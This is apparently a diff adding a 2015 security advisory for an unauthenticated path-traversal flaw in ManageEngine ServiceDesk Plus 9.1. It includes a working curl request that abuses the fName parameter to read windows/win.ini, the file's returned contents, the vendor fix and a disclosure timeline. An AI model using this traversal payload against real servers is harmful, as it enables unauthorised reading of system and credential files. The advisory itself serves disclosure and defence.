@@ -1,0 +1,79 @@
+Exploit Title: ManageEngine ServiceDesk Plus <= 9.1 build 9110 - Path
+Traversal
+Product: ManageEngine ServiceDesk Plus
+Vulnerable Versions: 9.1 build 9110 and previous versions
+Tested Version: 9.1 build 9110 (Windows)
+Advisory Publication: 03/10/2015
+Vulnerability Type: Unauthenticated Path Traversal
+Credit: xistence <xistence[at]0x90.nl>
+
+Product Description
+-------------------
+
+ServiceDesk Plus is an ITIL ready IT help desk software for organizations
+of all sizes. With advanced ITSM functionality and easy-to-use capability,
+ServiceDesk Plus helps IT support teams deliver world-class services to end
+users with reduced costs and complexity. Over 100,000 organizations across
+185 countries trust ServiceDesk Plus to optimize IT service desk
+performance and achieve high user satisfaction.
+
+
+Vulnerability Details
+---------------------
+
+The "fName" parameter is vulnerable to path traversal without the need for
+any authentication.
+On Windows environments, downloading files will be done with SYSTEM
+privileges. This makes it possible to download any file on the filesystem.
+
+The following example will download the "win.ini" file:
+
+$ curl "
+http://192.168.2.129:8080/workorder/FileDownload.jsp?module=support&fName=..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00
+"
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+[MCI Extensions.BAK]
+3g2=MPEGVideo
+3gp=MPEGVideo
+3gp2=MPEGVideo
+3gpp=MPEGVideo
+aac=MPEGVideo
+adt=MPEGVideo
+adts=MPEGVideo
+m2t=MPEGVideo
+m2ts=MPEGVideo
+m2v=MPEGVideo
+m4a=MPEGVideo
+m4v=MPEGVideo
+mod=MPEGVideo
+mov=MPEGVideo
+mp4=MPEGVideo
+mp4v=MPEGVideo
+mts=MPEGVideo
+ts=MPEGVideo
+tts=MPEGVideo
+
+
+Solution
+--------
+
+Upgrade to ServiceDesk 9.1 build 9111.
+
+
+Advisory Timeline
+-----------------
+
+07/10/2015 - Discovery and vendor notification
+07/10/2015 - ManageEngine responsed that they will notify their development
+team
+09/13/2015 - No response from vendor yet, asked for status update
+09/24/2015 - ManageEngine responded that they've fixed the issue and
+assigned issue ID: SD-60283
+09/28/2015 - Fixed ServiceDesk Plus version 9.1 build 9111 has been released
+10/03/2015 - Public disclosure
